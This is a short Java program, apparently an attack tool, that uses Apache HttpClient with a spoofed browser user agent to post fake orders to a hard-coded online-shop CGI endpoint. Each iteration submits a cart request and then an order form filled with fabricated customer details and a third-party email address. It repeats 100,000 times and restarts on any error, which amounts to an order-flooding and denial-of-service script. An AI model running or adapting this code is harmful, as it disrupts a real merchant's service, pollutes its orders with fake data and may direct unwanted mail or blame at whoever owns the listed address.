
import org.apache.http.*;
import org.apache.http.impl.client.*;
import org.apache.http.message.*;
public class Sampletool extends Thread {
    private static final String SU="http://z-02c.info/index.cgi";
    public static int j = 0;
    String userAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36";
    java.util.ArrayList<NameValuePair> params;
    java.util.ArrayList<NameValuePair> params3;
    {
        params = new java.util.ArrayList<>();
        params.add(new BasicNameValuePair("mode", "cart"));
        params.add(new BasicNameValuePair("no", "HYPER-1"));
        params.add(new BasicNameValuePair("itemname", "HYPER-CARD"));
        params.add(new BasicNameValuePair("price", "15500"));
        params.add(new BasicNameValuePair("kazu", "1"));

        params3 = new java.util.ArrayList<>();
        params3.add(new BasicNameValuePair("souryou", "1500"));
        params3.add(new BasicNameValuePair("tesuuryou", "500"));
        params3.add(new BasicNameValuePair("pref", "3"));
        params3.add(new BasicNameValuePair("memberon", ""));
        params3.add(new BasicNameValuePair("howpay", "3"));
        params3.add(new BasicNameValuePair("mode", "order3"));
        params3.add(new BasicNameValuePair("name", "山田"));
        params3.add(new BasicNameValuePair("furigana", "ヤマダ"));
        params3.add(new BasicNameValuePair("mail", "contact@success-happiness.com"));
        params3.add(new BasicNameValuePair("zip1", "111"));
        params3.add(new BasicNameValuePair("zip2", "1111"));
        params3.add(new BasicNameValuePair("add", "aaaaa"));
        params3.add(new BasicNameValuePair("tel", "09099998888"));
        params3.add(new BasicNameValuePair("deliday", "3"));
        params3.add(new BasicNameValuePair("delitime", "1"));
    }
    public void run() {
        try {
            java.util.ArrayList<Header> headers = new java.util.ArrayList<>();
            headers.add(new BasicHeader("Accept-Charset", "utf-8"));
            headers.add(new BasicHeader("Accept-Language", "ja, en;q=0.8"));
            headers.add(new BasicHeader("User-Agent", userAgent));
            CloseableHttpClient httpClient = HttpClientBuilder.create()
                    .setDefaultHeaders(headers).setMaxConnTotal(100)
                    .setRedirectStrategy(new LaxRedirectStrategy()).build();
            org.apache.http.client.methods.HttpPost post = new org.apache.http.client.methods.HttpPost(SU);
            for (int i = 0; i < 100000; i++) {
                post.setEntity(new org.apache.http.client.entity.UrlEncodedFormEntity(params));
                HttpResponse response = httpClient.execute(post);
                org.apache.http.util.EntityUtils.toString(response.getEntity(), "Shift_JIS");
                post.setEntity(new org.apache.http.client.entity.UrlEncodedFormEntity(params3));
                response = httpClient.execute(post);
                String body = org.apache.http.util.EntityUtils.toString(response.getEntity(), "Shift_JIS");
                System.out.println(body + i); }
        } catch (Exception ex) {run(); }
    }
    public static void main(String args[]) {   new Sampletool().start(); }
}
